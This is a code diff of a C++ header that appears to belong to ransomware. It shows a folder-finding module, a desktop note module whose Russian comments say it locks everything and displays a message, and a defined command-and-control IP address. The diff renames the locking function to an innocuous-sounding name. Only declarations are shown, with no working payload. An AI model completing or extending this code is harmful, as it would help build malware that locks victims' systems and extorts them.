@@ -14,6 +14,8 @@
 #include <locale>
 #include <shlobj.h> // For FileModule FOLDERID_*
 
+using path_t = std::filesystem::path;
+
 class FileModule
 {
 public:
@@ -22,17 +24,16 @@ private:
     PWSTR directoryPath_; // The directory that the FindDirectory method will assign
 
 };
-
 // Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
 class NoteModule
 {
     std::wstring Note_that_would_be_set_in_file;
 
-    void Create_README_file(std::filesystem::path README_path);
+    void Create_README_file(path_t const README_path);
 public:
     NoteModule();
     NoteModule(std::wstring Note_that_would_be_set_in_file);
-    void MakeSomeShit(); // Блокает к херам всё и выводит надпись
+    void NotifyUsersAboutWorkResults();
 };
 
 #define C2_IP_ADDRESS "192.168.255.254"
